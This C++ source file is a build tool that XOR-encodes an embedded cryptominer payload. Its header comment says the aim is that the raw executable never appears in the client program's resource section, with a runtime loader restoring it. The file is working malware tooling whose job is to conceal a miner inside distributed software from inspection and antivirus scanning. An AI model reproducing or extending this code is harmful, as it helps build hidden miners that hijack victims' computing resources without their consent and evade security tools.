// payload_encryptor.cpp -- build-time helper that encodes an embedded miner
// payload so the raw PE never appears in the client's .rsrc. Usage:
//   payload_encryptor <input> <output>
// Uses the same keystream as the runtime loader (payload_crypto.h), so the
// loader's symmetric transform restores the original bytes exactly.
#include <cstdint>
#include <cstdio>
#include <vector>

#include "../include/payload_crypto.h"

int main(int argc, char** argv)
{
    if (argc != 3)
    {
        std::fprintf(stderr, "usage: payload_encryptor <input> <output>\n");
        return 2;
    }

    std::FILE* in = std::fopen(argv[1], "rb");
    if (!in)
    {
        std::fprintf(stderr, "cannot open input: %s\n", argv[1]);
        return 2;
    }
    std::fseek(in, 0, SEEK_END);
    long len = std::ftell(in);
    std::fseek(in, 0, SEEK_SET);
    if (len < 0)
    {
        std::fprintf(stderr, "cannot size input: %s\n", argv[1]);
        std::fclose(in);
        return 2;
    }

    std::vector<std::uint8_t> buf(static_cast<std::size_t>(len));
    if (len > 0 && std::fread(buf.data(), 1, buf.size(), in) != buf.size())
    {
        std::fprintf(stderr, "read failed: %s\n", argv[1]);
        std::fclose(in);
        return 2;
    }
    std::fclose(in);

    PayloadCryptoXor(buf.data(), buf.size());

    std::FILE* out = std::fopen(argv[2], "wb");
    if (!out)
    {
        std::fprintf(stderr, "cannot open output: %s\n", argv[2]);
        return 2;
    }
    const bool ok = buf.empty() || std::fwrite(buf.data(), 1, buf.size(), out) == buf.size();
    std::fclose(out);
    if (!ok)
    {
        std::fprintf(stderr, "write failed: %s\n", argv[2]);
        return 2;
    }
    return 0;
}